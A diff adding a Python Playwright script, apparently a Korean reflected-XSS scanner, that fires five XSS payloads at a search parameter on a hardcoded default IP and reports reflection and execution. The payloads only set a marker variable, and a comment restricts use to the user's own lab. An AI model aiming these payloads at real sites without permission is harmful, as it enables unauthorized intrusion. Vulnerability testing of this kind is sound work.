@@ -1,0 +1,184 @@
+import argparse
+import secrets
+import time
+from urllib.parse import urlencode, urljoin
+from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
+
+# 본인이 관리하는 실습 환경에서만 사용
+
+PAYLOADS = [
+    (
+        "Script Tag",
+        lambda marker:
+            f"<script>window.__redweb_xss_probe='{marker}'</script>"
+    ),
+    (
+        "IMG onerror",
+        lambda marker:
+            f'<img src=x onerror="window.__redweb_xss_probe=\'{marker}\'">'
+    ),
+    (
+        "SVG onload",
+        lambda marker:
+            f'<svg onload="window.__redweb_xss_probe=\'{marker}\'"></svg>'
+    ),
+    (
+        "Attribute Breakout",
+        lambda marker:
+            f'"><img src=x onerror="window.__redweb_xss_probe=\'{marker}\'">'
+    ),
+    (
+        "Script Breakout",
+        lambda marker:
+            f"</script><script>window.__redweb_xss_probe='{marker}'</script>"
+    )
+]
+
+
+def test_xss(browser, base_url, path, param, delay):
+    target = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
+
+    print("=" * 65)
+    print("REDWEB Reflected XSS 자동 진단")
+    print(f"Target : {target}")
+    print(f"Param  : {param}")
+    print(f"Payload: {len(PAYLOADS)}개")
+    print("=" * 65)
+
+    results = []
+
+    for number, (name, build_payload) in enumerate(PAYLOADS, 1):
+        marker = f"REDWEB_XSS_{number}_{secrets.token_hex(4)}"
+        payload = build_payload(marker)
+
+        test_url = target + "?" + urlencode({param: payload})
+
+        page = browser.new_page()
+        page.on("dialog", lambda dialog: dialog.dismiss())
+
+        status = None
+        reflected = False
+        executed = False
+        error = None
+
+        try:
+            response = page.goto(
+                test_url,
+                wait_until="domcontentloaded",
+                timeout=10000
+            )
+
+            page.wait_for_timeout(1000)
+
+            if response:
+                status = response.status
+                html = response.text()
+                reflected = payload in html
+
+            executed = page.evaluate(
+                "(marker) => window.__redweb_xss_probe === marker",
+                marker
+            )
+
+        except PlaywrightTimeout:
+            error = "페이지 로딩 시간 초과"
+
+        except Exception as exc:
+            error = f"{type(exc).__name__}: {exc}"
+
+        finally:
+            page.close()
+
+        result = {
+            "name": name,
+            "status": status,
+            "reflected": reflected,
+            "executed": executed,
+            "error": error
+        }
+
+        results.append(result)
+
+        print(f"\n[{number}/{len(PAYLOADS)}] {name}")
+        print(f"  HTTP Status : {status}")
+        print(f"  HTML 반사   : {'YES' if reflected else 'NO'}")
+        print(f"  JS 실행     : {'YES' if executed else 'NO'}")
+
+        if executed:
+            print("  판정        : [XSS 실행 확인]")
+        elif error:
+            print(f"  오류        : {error}")
+        elif reflected:
+            print("  판정        : [문자열 반사, 실행 미확인]")
+        else:
+            print("  판정        : [실행 확인되지 않음]")
+
+        if number < len(PAYLOADS):
+            time.sleep(delay)
+
+    print("\n" + "=" * 65)
+    print("최종 진단 결과")
+    print("=" * 65)
+
+    executed_count = sum(r["executed"] for r in results)
+    reflected_count = sum(r["reflected"] for r in results)
+
+    print(f"전체 테스트 : {len(results)}")
+    print(f"원문 반사   : {reflected_count}")
+    print(f"JS 실행 확인: {executed_count}")
+
+    if executed_count:
+        print("\n[RESULT] XSS 실행 확인: 해당 입력 처리 로직 점검 필요")
+    else:
+        print("\n[RESULT] 이번 페이로드에서는 XSS 실행이 확인되지 않음")
+        print("※ 모든 XSS 취약점이 없다는 뜻은 아닙니다.")
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="REDWEB Reflected XSS 자동 진단 도구"
+    )
+
+    parser.add_argument(
+        "--base-url",
+        default="http://115.68.194.137:8080/"
+    )
+
+    parser.add_argument(
+        "--path",
+        default="/redweb/search"
+    )
+
+    parser.add_argument(
+        "--param",
+        default="keyword"
+    )
+
+    parser.add_argument(
+        "--delay",
+        type=float,
+        default=2.0
+    )
+
+    args = parser.parse_args()
+
+    if args.delay < 1:
+        parser.error("--delay는 1초 이상이어야 합니다.")
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+
+        try:
+            test_xss(
+                browser,
+                args.base_url,
+                args.path,
+                args.param,
+                args.delay
+            )
+        finally:
+            browser.close()
+
+
+if __name__ == "__main__":
+    main()
